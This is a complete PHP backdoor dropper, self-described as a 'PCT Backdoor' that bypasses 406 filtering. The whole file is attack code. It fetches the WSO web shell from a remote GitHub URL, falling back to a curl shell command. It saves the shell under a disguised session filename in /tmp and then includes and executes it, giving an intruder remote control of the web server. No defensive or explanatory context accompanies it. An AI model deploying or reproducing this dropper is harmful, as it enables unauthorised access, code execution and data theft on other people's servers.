<?
# PCT Backddor
# Bypass 406 Not Acceptable & Auto Delete Shell
# Coded by: AKDK - PCT

$URL = 'https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.0.php';	# Backdoor URL
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!

function M() {
	$FGT = @file_get_contents($GLOBALS['URL']);
	if(!$FGT) {
		echo `curl -k $(echo {$GLOBALS['URL']} | base64 -d) > {$GLOBALS['TMP']}`;
	} else {
		$HANDLE = fopen($GLOBALS['TMP'], 'w');
		fwrite($HANDLE, $FGT);
		fclose($HANDLE);
	}
	echo '<script>window.location="?akdk";</script>';
}

if(file_exists($TMP)) {
	if(filesize($TMP) === 0) {
		unlink($TMP);
		M();
	} else {
		include($TMP);
	}
} else {
	M();
}
?>